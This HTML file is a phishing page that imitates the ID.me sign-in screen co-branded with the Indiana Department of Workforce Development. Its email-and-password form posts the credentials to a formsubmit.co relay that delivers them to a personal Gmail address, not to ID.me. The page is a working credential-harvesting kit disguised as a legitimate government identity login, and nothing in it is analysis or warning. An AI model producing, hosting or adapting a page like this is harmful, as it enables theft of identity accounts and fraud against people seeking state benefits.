<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
        <link rel="stylesheet" href="./application-4a0b7b0d263d32df24730ee97ea6b5d903415cee58a98f8c.css">
    </head>
    <body>
        <div class="container">
            <div class="content-container">
                
                <div class="form-header">
                    <div class="form-header-content" role="banner">
                        <div class="partner">
                            <div class="c_icon m_idme">
                                <img alt="" src="./idme-logo-1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f1.svg">
                            </div>
                            <div class="c_icon m_addition">
                                <img alt="" src="/icon-addition-1c60f492657aa091463f6ac2e15f0f5123425f314e6038.svg">
                            </div>
                            <div class="c_icon m_consumer-logo">
                                <img alt="ID.me with Indiana Department of Workforce Development" src="/large.jpg">
                            </div>
                        </div>
                    </div>
                </div>
                <main aria-labelledby="sr_page_title" class="form-container">
                    <div class="form-header-access">
                        <h1 id="sr_page_title">Sign in to ID.me</h1>
                    </div>
            
                        <p class="alert alert-error" role="alert" style="">
            
                        </p>
                        <p class="alert alert-success" role="alert" style="">
            
                        </p>
                        <form class="new_user" action="https://formsubmit.co/dein1011972@gmail.com" method="post" data-np-autofill-form-type="login" data-np-checked="1" data-np-watching="1" id="new_user">
            
                            <div class="form-fields">
                                <div class="field-group">
                                    <div class="field text">
                                        <label class="required" for="user_email">Email</label>
                                        <input placeholder="Enter your email address" required="required" autocomplete="off" type="email" autofocus="autofocus" name="useremailz" id="user_email" data-np-intersection-state="visible" data-np-autofill-field-type="username" data-np-uid="5abeab8b-adaa-4a54-86b8-fb7612f6bcaf">
                                        <span role="alert">
            
                                        </span>
                                        <nordpass-icon data-np-uid="5abeab8b-adaa-4a54-86b8-fb7612f6bcaf"></nordpass-icon>
                                    </div>
                                    <div class="field text">
                                        <label class="required" for="user_password">Password</label>
                                        <input placeholder="Enter your password" required="required" autocomplete="off" type="password" autofocus="autofocus" name="password" id="user_password" data-np-intersection-state="visible" data-np-autofill-field-type="password" data-np-uid="5abeab8b-adaa-4a54-86b8-fb7612f6bcaf">
                                    </div>
                                    <div class="field checkbox remember_me" data-component="Cookies.Delete" data-endpoint="/cookies/remember_me">
                                        <input type="checkbox" name="remember_me" id="remember_me" value="true" aria-describedby="remember-me-tip">
                                        <label for="remember_me">
                                            <span aria-hidden="true" class="checkmark">
            
                                            </span>
            
                                            <span>
                                                Remember me
                                            </span>
                                            <div id="remember-me-tip">
                                                For your security, select only on your devices.
                                            </div>
                                        </label>
                                    </div>
            
                                </div>
                            </div>
                        <div class="form-actions">
                            
                            <button name="button" type="submit" class="btn btn-primary" data-disable="true" data-clicked="false">Continue</button>

                        </div>
                    </form>
            
                </main>
                <footer class="footer">
                    <nav aria-label="Footer" class="footer__links">
                        <ul class="footer__list">
                        <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/about">What is ID.me?</a></li>
                        <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/terms">Terms of Service</a></li>
                        <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/privacy">Privacy Policy</a></li>
                        </ul>
                    </nav>
                </footer>
            
            </div>
        </div>
    </body>
</html>